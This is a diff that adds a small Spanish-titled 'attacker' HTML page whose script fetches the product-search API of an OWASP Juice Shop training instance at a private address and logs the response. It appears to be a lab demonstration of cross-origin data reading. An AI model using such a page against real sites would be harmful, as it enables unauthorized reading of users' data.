@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Web atacante</title>
+</head>
+<body>
+  <h1>Atacando Juice Shop...</h1>
+  <script>
+    fetch("http://192.168.0.99:3000/rest/products/search?q=")
+    .then(res => res.json())
+    .then(data => console.log(data))
+  </script>
+</body>
+</html>
